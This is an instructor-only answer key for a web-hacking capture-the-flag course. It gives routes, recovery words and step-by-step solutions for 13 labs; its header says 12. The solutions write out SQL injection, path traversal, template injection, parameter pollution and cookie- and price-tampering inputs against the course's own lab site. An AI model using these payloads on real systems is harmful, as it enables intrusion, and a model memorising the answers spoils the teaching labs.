# Day 8 — Web Application Hacking: Instructor guide

> **Instructor / tester only.** Do not share with students.  
> Site: `https://ctf-two-alpha.vercel.app` · Day code: **`WEBHACK-2026`** · **12 live labs**

---

## Quick checklist

| # | Title | Level | Route | Answer | Pass if… |
|---|-------|-------|-------|--------|----------|
| 1 | Door Map | Easy | `/challenge/door-map` | `staff_closet_ok` | Staff closet shows label |
| 2 | Header Mirror | Easy | `/challenge/header-mirror` | `desk_echo` | Ping unlocks code |
| 3 | Method Gate | Easy | `/challenge/method-gate` | `post_only_note` | POST form yields note |
| 4 | Cookie Lounge | Medium | `/challenge/cookie-lounge` | `vip_plaque` | VIP plaque |
| 5 | Proxy Price | Medium | `/challenge/proxy-price` | `cheap_slip` | Buy with price≤50 |
| 6 | Hashed Dossier | Medium | `/challenge/hashed-dossier` | `counselor_file` | Counselor note |
| 7 | Step Skip | Medium | `/challenge/step-skip` | `skipped_confirm` | Execute without confirm |
| 8 | Verb Smuggle | Hard | `/challenge/verb-smuggle` | `lock_cleared` | DELETE clears lock |
| 9 | Twin Param | Hard | `/challenge/twin-param` | `hpp_staff` | Dual role= bypass |
| 10 | Graph Attic | Hard | `/challenge/graph-attic` | `attic_note` | elevate + atticNote |
| 11 | Hidden Ledger | Hard | `/challenge/hidden-ledger` | `ledger_bypass_ok` | SQLi bypass + comment |
| 12 | Filter Crawl | Danger | `/challenge/filter-crawl` | `sealed_outside` | Escape brochure root |
| 13 | Template Vault | Danger | `/challenge/template-vault` | `vault_line` | `{{ vault }}` renders |

**Submit:** recovery word in Answer box → personal `KGSP{…}`.

**Friend TA ideas (cleaned into this pack):** Cookie Lounge, Hashed Dossier, Twin Param, Graph Attic, Template Vault, Hidden Ledger.

---

## Easy

### 1 · Door Map · `staff_closet_ok`
1. Open lobby → open linked `robots.txt` under `/challenges/day8/robots.txt`.
2. Visit `/challenge/door-map/staff-closet`.
3. Submit label.

### 2 · Header Mirror · `desk_echo`
1. Click **Ping desk**.
2. Network → `ping.txt` → Response Headers → `X-Desk-Ticket: mirror-7`.
3. Page decrypts plaque → `desk_echo`.

### 3 · Method Gate · `post_only_note`
1. Inspect the form (`method="get"`).
2. Change to `method="post"` (Elements) → Request note.
3. Submit `post_only_note`.

---

## Medium

### 4 · Cookie Lounge · `vip_plaque`
Cookie `d8_lounge` = `btoa("guest:free")`. Set to `btoa("guest:vip")` → plaque.

### 5 · Proxy Price · `cheap_slip`
Hidden `price=9999` in form. Change to `1` (or ≤50) before submit (proxy / Elements).

### 6 · Hashed Dossier · `counselor_file`
Student 42 id shown. Counselor seat **7**. Encode `d8r-` + btoa(`7*17+3` + `-kgsp`) = `d8r-` + btoa(`122-kgsp`). Put that in `?id=`.

### 7 · Step Skip · `skipped_confirm`
Create draft → **Execute** without Confirm.

---

## Hard

### 8 · Verb Smuggle · `lock_cleared`
Console: `__d8Lock('DELETE')` or `__d8Lock('POST','DELETE')`.

### 9 · Twin Param · `hpp_staff`
URL: `?username=employee1&role=user&role=staff` → Apply.

### 10 · Graph Attic · `attic_note`
1. Query `{ __schema { ... } }` or include `__schema`.
2. `mutation { setStaff(true) }` (lab accepts `setStaff(true)`).
3. Query `atticNote` while staff.

### 11 · Hidden Ledger · `ledger_bypass_ok`
Simulated query: `WHERE acct = '<input>' AND closed = 0`
1. `'` alone → `Database Syntax Error near '''`
2. Random id → `Account not found.`
3. `admin' OR '1'='1` alone → still not found (trailing `AND closed = 0`).
4. Working: `x' OR '1'='1'--` or `x' OR 1=1--` (or `#` / `/*`).

---

## Danger

### 12 · Filter Crawl · `sealed_outside`
Single `../` is stripped once. Use doubled form e.g. `....//sealed/note.txt` so after one strip a parent remains and normalizes to `/var/sealed/note.txt`.

### 13 · Template Vault · `vault_line`
`{{7*7}}` → 49 proves eval. Shell gadgets denied. Use `{{ vault }}`.

---

## Ops

- Day open + code `WEBHACK-2026`.
- Frontend: `src/challenges/day8/*` · migrations `20260714_1200_day8_webapp_hacking.sql`, `20260714_1230_day8_hidden_ledger.sql`.
- `vercel.json` sets `X-Desk-Ticket` on `/challenges/day8/ping.txt` (Vite middleware mirrors locally).
